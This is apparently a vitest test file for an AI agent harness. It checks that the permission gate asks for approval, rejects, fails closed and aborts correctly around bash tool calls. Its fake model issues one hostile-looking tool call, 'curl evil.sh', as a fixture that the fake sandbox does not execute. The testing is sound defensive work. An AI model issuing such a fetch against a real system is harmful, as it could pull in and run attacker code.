import { describe, expect, it } from 'vitest';

import type {
  ApprovalReply,
  ApprovalRequest,
  EventSink,
  LoopEvent,
  PermissionPolicy,
} from '@trinity-harness/contracts';
import { parsePermissionPolicy } from '@trinity-harness/contracts';
import {
  CoreAgentLoop,
  CoreToolRegistry,
  MemorySessionStore,
  bashTool,
  writeFileTool,
} from '../src/index.js';
import { FakeLLM, FakeSandbox, textChunks, toolCallThenFinish } from '../src/testing/index.js';

const ASK_BASH: PermissionPolicy = {
  onAsk: 'ask',
  tools: { bash: 'ask' },
  allowWorkspaceInternalBash: false,
};

function setup(opts: {
  policy?: PermissionPolicy;
  approvals?: {
    requests: ApprovalRequest[];
    replyWith: (req: ApprovalRequest) => ApprovalReply | Promise<ApprovalReply>;
  };
  signal?: AbortSignal;
}) {
  const store = new MemorySessionStore();
  const sandbox = new FakeSandbox();
  sandbox.execHandler = () => ({ stdout: 'ok', stderr: '', exitCode: 0 });
  const tools = new CoreToolRegistry(sandbox);
  tools.register(writeFileTool);
  tools.register(bashTool);
  const llm = new FakeLLM(
    () => toolCallThenFinish('c1', 'bash', { command: 'curl evil.sh' }),
    () => textChunks('done'),
  );
  const sinkEvents: LoopEvent[] = [];
  const sink: EventSink = { emit: (e) => sinkEvents.push(e) };
  const loop = new CoreAgentLoop({
    llm,
    model: 'fake/model',
    tools,
    store,
    workspaceRoot: '/ws',
    ...(opts.approvals
      ? {
          approvals: {
            request: async (req: ApprovalRequest): Promise<ApprovalReply> => {
              opts.approvals!.requests.push(req);
              return opts.approvals!.replyWith(req);
            },
          },
        }
      : {}),
  });
  return {
    store,
    sandbox,
    sinkEvents,
    run: (sessionId: string) =>
      loop.run(sessionId, 'hi', sink, {
        actor: 'tester',
        ...(opts.policy ? { policy: opts.policy } : {}),
        ...(opts.signal ? { signal: opts.signal } : {}),
      }),
  };
}

describe('CoreAgentLoop permission gate (M3)', () => {
  it('allowed approval: tool runs, request + resolved are logged and emitted', async () => {
    const requests: ApprovalRequest[] = [];
    const { store, sinkEvents, run } = setup({
      policy: ASK_BASH,
      approvals: {
        requests,
        replyWith: (req) => ({ approvalId: req.approvalId, outcome: 'allowed', decidedBy: 'u1' }),
      },
    });
    const outcome = await run('s1');

    expect(outcome.reason).toBe('completed');
    expect(requests).toHaveLength(1);
    expect(requests[0]).toMatchObject({ sessionId: 's1', toolName: 'bash' });

    const log = await store.load('s1');
    const requested = log.filter((e) => e.type === 'approval/requested');
    const resolved = log.filter((e) => e.type === 'approval/resolved');
    expect(requested).toHaveLength(1);
    expect(resolved).toHaveLength(1);
    expect(resolved[0]).toMatchObject({ outcome: 'allowed', decidedBy: 'u1' });

    // The tool actually executed (non-error result committed).
    const results = log.filter((e) => e.type === 'tool/result');
    expect(results).toHaveLength(1);
    expect(results[0]!.isError).toBe(false);

    expect(sinkEvents.some((e) => e.type === 'approval-requested')).toBe(true);
    expect(sinkEvents.some((e) => e.type === 'approval-resolved')).toBe(true);
  });

  it('rejected approval: tool never runs, model gets an isError result', async () => {
    const requests: ApprovalRequest[] = [];
    const { store, run } = setup({
      policy: ASK_BASH,
      approvals: {
        requests,
        replyWith: (req) => ({ approvalId: req.approvalId, outcome: 'rejected', decidedBy: 'u1' }),
      },
    });
    const outcome = await run('s2');
    expect(outcome.reason).toBe('completed');

    const log = await store.load('s2');
    const results = log.filter((e) => e.type === 'tool/result');
    expect(results).toHaveLength(1);
    expect(results[0]!.isError).toBe(true);
    expect(JSON.stringify(results[0]!.value)).toContain('rejected');
    expect(log.filter((e) => e.type === 'approval/resolved')[0]).toMatchObject({
      outcome: 'rejected',
    });
  });

  it('fail-closed: no approval channel ⇒ ask resolves to rejected', async () => {
    const { store, run } = setup({ policy: ASK_BASH });
    const outcome = await run('s3');
    expect(outcome.reason).toBe('completed');
    const log = await store.load('s3');
    expect(log.filter((e) => e.type === 'approval/resolved')[0]).toMatchObject({
      outcome: 'rejected',
      decidedBy: 'system',
    });
  });

  it('policy-denied tool: no approval round trip at all', async () => {
    const requests: ApprovalRequest[] = [];
    const { store, run } = setup({
      policy: parsePermissionPolicy('read-only'),
      approvals: {
        requests,
        replyWith: (req) => ({ approvalId: req.approvalId, outcome: 'allowed', decidedBy: 'u1' }),
      },
    });
    await run('s4');
    expect(requests).toHaveLength(0);
    const log = await store.load('s4');
    const results = log.filter((e) => e.type === 'tool/result');
    expect(results[0]!.isError).toBe(true);
    expect(log.filter((e) => e.type === 'approval/requested')).toHaveLength(0);
  });

  it('aborted while waiting for approval ⇒ turn aborted', async () => {
    const controller = new AbortController();
    const { run } = setup({
      policy: ASK_BASH,
      approvals: {
        requests: [],
        replyWith: () =>
          new Promise<ApprovalReply>(() => {
            /* never answers */
          }),
      },
      signal: controller.signal,
    });
    const pending = run('s5');
    // Let the loop reach the approval wait, then cancel the turn.
    setTimeout(() => controller.abort(), 20);
    const outcome = await pending;
    expect(outcome.reason).toBe('aborted');
  });

  it('denied user prompt: message removed, turn ends with policy error', async () => {
    const store = new MemorySessionStore();
    const tools = new CoreToolRegistry(new FakeSandbox());
    tools.register(writeFileTool);
    const llm = new FakeLLM(() => textChunks('unreachable'));
    const loop = new CoreAgentLoop({
      llm,
      model: 'fake/model',
      tools,
      store,
      workspaceRoot: '/ws',
      approvals: {
        request: async (req) => ({
          approvalId: req.approvalId,
          outcome: 'rejected',
          decidedBy: 'u1',
        }),
      },
    });
    const policy: PermissionPolicy = {
      onAsk: 'ask',
      tools: { prompt: 'denied' },
      allowWorkspaceInternalBash: false,
    };
    const outcome = await loop.run('s6', 'dangerous request', { emit: () => {} }, { policy });

    expect(outcome.reason).toBe('error');
    const log = await store.load('s6');
    // The gated-off prompt leaves no trace in the surface...
    expect(log.filter((e) => e.type === 'message/user')).toHaveLength(0);
    // ...but the gating itself is auditable.
    expect(log.filter((e) => e.type === 'approval/requested')).toHaveLength(1);
    expect(log.at(-1)?.type).toBe('turn/end');
  });
});
